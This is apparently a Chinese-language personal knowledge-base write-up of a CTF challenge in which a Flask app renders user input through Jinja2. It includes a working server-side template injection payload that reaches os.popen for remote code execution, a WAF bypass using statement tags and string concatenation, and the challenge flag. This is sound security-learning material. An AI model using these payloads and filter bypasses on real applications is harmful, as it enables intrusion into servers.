---
type: source
created: 2026-05-11
updated: 2026-05-11
related: []
---

# LitCTF2025 星愿信箱 (NSSCTF)

Flask (Werkzeug) SSTI。WAF 过滤了 `{{ }}` 但未过滤 `{% %}`，用 `{% print() %}` 绕过。通过 `lipsum.__globals__["os"].popen()` 实现 RCE，Python 字符串拼接绕过命令关键字过滤读取 flag。

涉及概念：[[concepts/jinja2-ssti-tag-bypass]]
涉及实体：[[entities/ctf_nssctf]]

## 挑战

Flask 应用，POST JSON `{"cmd": "..."}` 到 `/`，输入被 Jinja2 渲染后返回。

## WAF 规则

| 被拦截 | 未拦截 |
|--------|--------|
| `{{ }}` 表达式标签 | `{% %}` 语句标签 |
| `eval` | `__globals__`, `os`, `popen` |
| `cat /flag` 组合 | `lipsum`, `config`, `request` |

## 利用链

```
{% print(lipsum.__globals__["os"].popen("head /fla"+"g").read()) %}
```

1. `{% print() %}` 绕过 `{{ }}` 过滤
2. `lipsum.__globals__["os"]` 获取 os 模块
3. `.popen("head /fla"+"g")` — Python 字符串拼接绕过 `flag` 关键字过滤

## Flag

```
NSSCTF{09a5e89d-0100-4822-8b81-d196250e2f02}
```

## 踩坑

- `cat /flag` 整体被拦，但 `head`/`tac` + 字符串拼接可绕过
- 纯 `{{7*7}}`（不含普通文字）返回"需要包含文字内容"，需要前缀普通字符
